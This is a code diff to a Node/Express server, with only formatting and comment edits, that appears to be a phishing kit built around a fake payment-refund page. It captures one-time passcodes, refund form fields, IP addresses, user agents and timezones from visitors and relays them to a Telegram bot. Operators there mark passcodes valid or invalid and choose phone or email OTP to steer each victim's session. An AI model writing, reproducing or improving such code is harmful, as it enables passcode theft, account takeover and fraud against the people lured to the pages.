@@ -20,7 +20,8 @@ const store = new Map();
 // Initialize Express
 const app = express();
 
-// 1) Enable CORS for your static domain (adjust to match your GoDaddy domain)
+// 1) Enable CORS if you need it for a custom domain
+//    (adjust or remove origin as appropriate)
 app.use(cors({
   origin: 'https://pay.yourdomain.com',
   credentials: true
@@ -31,7 +32,7 @@ app.use(session({
   secret: 'your-session-secret',
   resave: false,
   saveUninitialized: true,
-  cookie: { secure: false } // set `true` if you serve entirely over HTTPS
+  cookie: { secure: false } // set to true if you serve over HTTPS only
 }));
 
 // === Static page serving ===
@@ -41,10 +42,10 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Let Express serve ANY other file from the project root:
-//   loading.html  → /loading.html
-//   refund.html   → /refund.html
-//   success.html  → /success.html
+// Serve any other file from the project root:
+//   loading.html → /loading.html
+//   refund.html  → /refund.html
+//   success.html → /success.html
 //   js/*, style/*, img/*, etc.
 app.use(express.static(path.join(__dirname)));
 
@@ -63,7 +64,7 @@ function findSessionByChatId(chatId) {
 
 // --- API routes ---
 
-// 0) Bind-refund (called from refund.html)
+// 0) Bind‑refund (called from refund.html)
 app.post('/bind-refund', (req, res) => {
   const { chatId, ua, tz } = req.body;
   const sess = store.get(req.session.id) || {};
@@ -84,7 +85,7 @@ app.post('/bind-refund', (req, res) => {
   res.sendStatus(200);
 });
 
-// 1) Bind-chat (called from loading.html to start OTP flow)
+// 1) Bind‑chat (called from loading.html to start OTP flow)
 app.post('/bind-chat', (req, res) => {
   const { chatId, ua, tz } = req.body;
   const sess = {
@@ -114,6 +115,7 @@ app.post('/bind-chat', (req, res) => {
       }
     }
   );
+
   res.sendStatus(200);
 });
 
@@ -132,8 +134,8 @@ app.post('/submit-otp', (req, res) => {
   const { otp, ua, tz } = req.body;
   const sess = store.get(req.session.id) || {};
   sess.submittedOtp = otp;
-  sess.subUA = ua;
-  sess.subTZ = tz;
+  sess.subUA        = ua;
+  sess.subTZ        = tz;
   delete sess.valid;
   store.set(req.session.id, sess);
 
@@ -149,7 +151,7 @@ app.post('/submit-otp', (req, res) => {
         reply_markup: {
           inline_keyboard: [
             [
-              { text: '✅ Valid OTP', callback_data: 'verifyOtp:ok' },
+              { text: '✅ Valid OTP',   callback_data: 'verifyOtp:ok' },
               { text: '❌ Invalid OTP', callback_data: 'verifyOtp:fail' }
             ]
           ]
@@ -157,13 +159,16 @@ app.post('/submit-otp', (req, res) => {
       }
     );
   }
+
   res.sendStatus(200);
 });
 
 // 4) Poll for OTP verification result
 app.get('/otp-verify-status', (req, res) => {
   const sess = store.get(req.session.id) || {};
-  res.json({ valid: typeof sess.valid === 'boolean' ? sess.valid : null });
+  res.json({
+    valid: typeof sess.valid === 'boolean' ? sess.valid : null
+  });
 });
 
 // 5) Receive refund requests
@@ -172,7 +177,7 @@ app.post('/refund', (req, res) => {
   const sess = store.get(req.session.id) || {};
   if (sess.chatId) {
     let msg = `📝 Refund Request\n<b>Session:</b> ${req.session.id}\n`;
-    Object.entries(data).forEach(([k,v]) => {
+    Object.entries(data).forEach(([k, v]) => {
       msg += `<b>${k}:</b> ${v}\n`;
     });
     msg += `<b>IP:</b> ${sess.ip}\n`;
@@ -184,14 +189,14 @@ app.post('/refund', (req, res) => {
 
 // --- Telegram callback handlers ---
 bot.on('callback_query', query => {
-  const [action,param] = query.data.split(':');
+  const [action, param] = query.data.split(':');
   const chatId    = query.message.chat.id;
   const sessionId = findSessionByChatId(chatId);
 
   if (action === 'startOtp' && sessionId) {
     const sess = store.get(sessionId);
     sess.ready  = true;
-    sess.method = (param === 'phone' ? 'phone' : 'email');
+    sess.method = param === 'phone' ? 'phone' : 'email';
     store.set(sessionId, sess);
     bot.answerCallbackQuery(query.id, { text: `OTP via ${param} selected` });
     bot.sendMessage(chatId, `🔔 OTP form enabled via ${param}.`);
